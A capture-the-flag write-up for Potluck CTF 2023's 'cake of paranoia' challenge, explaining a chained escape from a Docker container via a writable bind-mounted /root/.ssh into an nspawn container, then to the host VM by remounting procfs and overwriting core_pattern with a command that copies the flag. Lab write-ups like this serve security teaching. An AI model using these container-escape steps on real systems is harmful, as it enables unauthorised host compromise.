```
A layer cake of paranoia. Please enjoy, and don't be afraid to take seconds.
```

I blooded the chal :) with a cheese strat way easier than intended
[challenge01-dist.tgz](https://storage.googleapis.com/potluckctf/challenge01-dist.tgz)

We're provided a rootfs and tcp connection info which gets us a shell. 

```
potluck-ctf-2023/cake-of-paranoia/rootfs 
❯ fd

etc/systemd/nspawn/
etc/systemd/nspawn/ubuntu.nspawn
etc/systemd/system.control/systemd-nspawn@ubuntu.service.d/
etc/systemd/system.control/systemd-nspawn@ubuntu.service.d/50-DeviceAllow.conf
...
etc/systemd/system/multi-user.target.wants/machines.target
etc/systemd/system/machines.target.wants/
etc/systemd/system/machines.target.wants/systemd-nspawn@ubuntu.service
...
var/lib/machines/ubuntu/
usr/lib/libnss_mymachines.so.2
usr/share/man/man1/systemd-machine-id-setup.1.gz
var/lib/machines/ubuntu/opt/
var/lib/machines/ubuntu/opt/containerd/
var/lib/machines/ubuntu/opt/containerd/bin/
var/lib/machines/ubuntu/opt/containerd/lib/
var/lib/machines/ubuntu/bin
var/lib/machines/ubuntu/sys/
var/lib/machines/ubuntu/media/
var/lib/machines/ubuntu/lib
var/lib/machines/ubuntu/run/
var/lib/machines/ubuntu/boot/
...
var/lib/machines/ubuntu/var/lib/docker/
var/lib/machines/ubuntu/var/lib/docker/engine-id
var/lib/machines/ubuntu/var/lib/docker/runtimes/
var/lib/machines/ubuntu/var/lib/docker/network/
var/lib/machines/ubuntu/var/lib/docker/network/files/
var/lib/machines/ubuntu/var/lib/docker/network/files/local-kv.db
var/lib/machines/ubuntu/var/lib/docker/volumes/
var/lib/machines/ubuntu/var/lib/docker/volumes/metadata.db
var/lib/machines/ubuntu/var/lib/docker/volumes/backingFsBlockDev
var/lib/machines/ubuntu/var/lib/docker/containers/
var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/
var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221-json.log
var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/mounts/
var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/hosts
var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/hostconfig.json
var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/resolv.conf.hash
var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/resolv.conf
var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/config.v2.json
```

Examining the rootfs and connecting to the shell the general structure of the challenge becomes clear. 

We connect into a shell inside a docker container. This docker container is running inside a systemd nspawn container.  This nspawn container is running inside an arch vm and the flag is present in /flag.txt inside the top level vm. 

```js
// runs every minute by cron
const GLib = imports.gi.GLib;

if (!GLib.access("/flag.txt", 0)) {
  console.log("yay, the flag's still there!");
} else {
  console.log("whoops, the flag's gone");
}
```

We'll need to do two container escapes -- first from docker to nspawn and then from nspawn to the top level. I'll first examine the docker container for any security-relevant configuration. 

```
> cat /proc/self/status | grep CapEff
CapEff: 00000000a80425fb
> capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Capabilities are more or less uninteresting -- default and nothing that can be leverage to break out. Looking inside the container config though shows something very suspicious -- that /root is mounted as a volume inside the container.  

```json
{
  "StreamConfig": {},
  "State": {
    "Running": true,
    "Paused": false,
    "Restarting": false,
    "OOMKilled": false,
    "RemovalInProgress": false,
    "Dead": false,
    "Pid": 466,
    "ExitCode": 0,
    "Error": "",
    "StartedAt": "2023-11-29T08:37:47.639966172Z",
    "FinishedAt": "0001-01-01T00:00:00Z",
    "Health": null
  },
  "ID": "68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221",
  "Created": "2023-11-29T08:37:46.082139124Z",
  "Managed": false,
  "Path": "socat",
  "Args": [
    "-d",
    "-d",
    "TCP-LISTEN:1337,reuseaddr,fork",
    "EXEC:/bin/sh,stderr"
  ],
  "Config": {
    "Hostname": "68be6028e3e4",
    "Domainname": "",
    "User": "",
    "AttachStdin": false,
    "AttachStdout": false,
    "AttachStderr": false,
    "ExposedPorts": {
      "1337/tcp": {}
    },
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": null,
    "Image": "entrypoint",
    "Volumes": null,
    "WorkingDir": "",
    "Entrypoint": [
      "socat",
      "-d",
      "-d",
      "TCP-LISTEN:1337,reuseaddr,fork",
      "EXEC:/bin/sh,stderr"
    ],
    "OnBuild": null,
    "Labels": {}
  },
  "Image": "sha256:8adf4a1c6bc350ad16f843424110069b69e4423ef4d87daa39c38ab001659166",
  "ImageManifest": null,
  "NetworkSettings": {
    "Bridge": "",
    "SandboxID": "e1a8b0eceb93d2ed34f0e5f0c5935963554cf35071a19b7dbb692c1e25540c7e",
    "HairpinMode": false,
    "LinkLocalIPv6Address": "",
    "LinkLocalIPv6PrefixLen": 0,
    "Networks": {
      "bridge": {
        "IPAMConfig": null,
        "Links": null,
        "Aliases": null,
        "NetworkID": "8a082b6e4f0e46624e5ca1cc014fc1a5a52f44d6b4ce65cc6a015b7391de87de",
        "EndpointID": "07628d86f5bf567d848707f7f1af75d72bf89059d19349ab71f21b6d0fdf25bc",
        "Gateway": "172.17.0.1",
        "IPAddress": "172.17.0.2",
        "IPPrefixLen": 16,
        "IPv6Gateway": "",
        "GlobalIPv6Address": "",
        "GlobalIPv6PrefixLen": 0,
        "MacAddress": "02:42:ac:11:00:02",
        "DriverOpts": null,
        "IPAMOperational": false
      }
    },
    "Service": null,
    "Ports": {
      "1337/tcp": [
        {
          "HostIp": "0.0.0.0",
          "HostPort": "1337"
        },
        {
          "HostIp": "::",
          "HostPort": "1337"
        }
      ]
    },
    "SandboxKey": "/var/run/docker/netns/e1a8b0eceb93",
    "SecondaryIPAddresses": null,
    "SecondaryIPv6Addresses": null,
    "IsAnonymousEndpoint": true,
    "HasSwarmEndpoint": false
  },
  "LogPath": "/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221-json.log",
  "Name": "/jovial_mcnulty",
  "Driver": "overlay2",
  "OS": "linux",
  "RestartCount": 0,
  "HasBeenStartedBefore": true,
  "HasBeenManuallyStopped": false,
  "MountPoints": {
    "/root": {
      "Source": "/root",
      "Destination": "/root",
      "RW": true,
      "Name": "",
      "Driver": "",
      "Type": "bind",
      "Propagation": "rprivate",
      "Spec": {
        "Type": "bind",
        "Source": "/root",
        "Target": "/root"
      },
      "SkipMountpointCreation": false
    }
  },
  "SecretReferences": null,
  "ConfigReferences": null,
  "MountLabel": "",
  "ProcessLabel": "",
  "AppArmorProfile": "",
  "SeccompProfile": "",
  "NoNewPrivileges": false,
  "HostnamePath": "/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/hostname",
  "HostsPath": "/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/hosts",
  "ShmPath": "",
  "ResolvConfPath": "/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/resolv.conf",
  "LocalLogCacheMeta": {
    "HaveNotifyEnabled": false
  }
}
```

Following up on that shows that we have write access to root's .ssh directory, sshd is running on the host, and the host and docker container are networked together.  After fighting for a long time with the IO, I managed to get dropbear on inside the container and confirmed I could ssh up a level.

00000000fdecbfff
```
> cat /proc/self/status | grep CapEff
CapEff: 00000000fdecbfff
> capsh --decode=00000000fdecbfff
0x00000000fdecbfff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_owner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap
```

Looking at the config shows we are explicitly allowed to invoke add_key, keyctl, or bpf syscalls inside the container. 

```
[Exec]
Boot=true
PrivateUsers=false
SystemCallFilter=add_key keyctl bpf

[Network]
Zone=guests
Port=1337

[Files]
Bind=/dev/fuse
```

I know the author well enough to know that the intended solution is bpf fuckery (with the bpf syscall and cap_sys_admin) but I don't know bpf well and didn't want to do that. Fortunately for me, cap_sys_admin is an unreasonably powerful capability and there are other routes. 

Systemd, by default, mounts procfs and sys as read-only. It does not prevent a user with the appropriate (and default) capabilities from mounting procfs again r/w. Once you have write access to procfs it's trivial to escalate privileges by modifying core_pattern.

```
> echo '|/usr/bin/cp /flag.txt /var/lib/machines/ubuntu/flag.txt' > proc/sys/kernel/core_pattern
./crash
> cat /flag.txt
potluck{sometimes-we-all-get-in-a-little-over-our-heads-dont-we}
```